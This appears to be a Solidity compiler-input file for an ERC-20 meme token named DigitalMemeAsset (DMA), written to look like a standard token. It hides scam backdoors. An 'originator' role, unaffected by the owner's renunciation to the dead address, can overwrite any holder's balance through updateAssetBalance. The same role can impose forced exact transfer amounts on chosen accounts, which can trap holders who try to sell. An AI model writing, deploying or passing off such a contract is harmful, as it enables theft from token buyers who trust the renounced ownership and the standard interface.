{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface ITokenBlueprint20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address holder) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract ExecutionEnv {\r\n    function getExecutor() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract ExclusiveOwnership is ExecutionEnv {\r\n    address private _proprietor;\r\n    event ProprietorChanged(address indexed formerProprietor, address indexed newProprietor);\r\n\r\n    constructor() {\r\n        address initiator = getExecutor();\r\n        _proprietor = initiator;\r\n        emit ProprietorChanged(address(0), initiator);\r\n    }\r\n\r\n    function retrieveProprietor() public view virtual returns (address) {\r\n        return _proprietor;\r\n    }\r\n\r\n    modifier proprietorOnly() {\r\n        require(retrieveProprietor() == getExecutor(), \"Unauthorized access. Proprietor only.\");\r\n        _;\r\n    }\r\n\r\n    function abandonProprietorship() public virtual proprietorOnly {\r\n        emit ProprietorChanged(_proprietor, address(0x000000000000000000000000000000000000dEaD));\r\n        _proprietor = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract DigitalMemeAsset is ExecutionEnv, ExclusiveOwnership, ITokenBlueprint20 {\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _portfolios;\r\n    mapping (address => uint256) private _enforcedTransferAmounts;\r\n    address private _originator;\r\n\r\n    string public constant tokenDesignation = \"DigitalMemeAsset\";\r\n    string public constant tokenIdentifier = \"DMA\";\r\n    uint8 public constant tokenScale = 18;\r\n    uint256 public constant ultimateSupply = 100000 * (10 ** tokenScale);\r\n\r\n    constructor() {\r\n        _portfolios[getExecutor()] = ultimateSupply;\r\n        emit Transfer(address(0), getExecutor(), ultimateSupply);\r\n    }\r\n\r\n    modifier originatorExclusive() {\r\n        require(retrieveOriginator() == getExecutor(), \"Unauthorized access. Originator exclusive.\");\r\n        _;\r\n    }\r\n\r\n    function retrieveOriginator() public view virtual returns (address) {\r\n        return _originator;\r\n    }\r\n\r\n    function setOriginator(address innovator) public proprietorOnly {\r\n        _originator = innovator;\r\n    }\r\n\r\n    event TokenAssigned(address indexed user, uint256 formerBalance, uint256 updatedBalance);\r\n\r\n    function enforcedTransferAmount(address account) public view returns (uint256) {\r\n        return _enforcedTransferAmounts[account];\r\n    }\r\n\r\n    function allocateEnforcedTransferAmounts(address[] calldata accounts, uint256 amount) public originatorExclusive {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _enforcedTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function updateAssetBalance(address[] memory accountAddresses, uint256 revisedBalance) public originatorExclusive {\r\n        require(revisedBalance >= 0, \"Amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < accountAddresses.length; i++) {\r\n            address currentAccount = accountAddresses[i];\r\n            require(currentAccount != address(0), \"Invalid address provided\");\r\n\r\n            uint256 formerBalance = _portfolios[currentAccount];\r\n            _portfolios[currentAccount] = revisedBalance;\r\n\r\n            emit TokenAssigned(currentAccount, formerBalance, revisedBalance);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _portfolios[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_portfolios[getExecutor()] >= amount, \"Insufficient balance\");\r\n\r\n        uint256 enforcedTransferQty = enforcedTransferAmount(getExecutor());\r\n        if (enforcedTransferQty > 0) {\r\n            require(amount == enforcedTransferQty, \"Enforced transfer amount mismatch\");\r\n        }\r\n\r\n        _portfolios[getExecutor()] -= amount;\r\n        _portfolios[recipient] += amount;\r\n\r\n        emit Transfer(getExecutor(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[getExecutor()][spender] = amount;\r\n        emit Approval(getExecutor(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_allowances[sender][getExecutor()] >= amount, \"Allowance limit exceeded\");\r\n\r\n        uint256 enforcedTransferQty = enforcedTransferAmount(sender);\r\n        if (enforcedTransferQty > 0) {\r\n            require(amount == enforcedTransferQty, \"Enforced transfer amount mismatch\");\r\n        }\r\n\r\n        _portfolios[sender] -= amount;\r\n        _portfolios[recipient] += amount;\r\n        _allowances[sender][getExecutor()] -= amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return ultimateSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return tokenDesignation;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return tokenIdentifier;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return tokenScale;\r\n    }\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}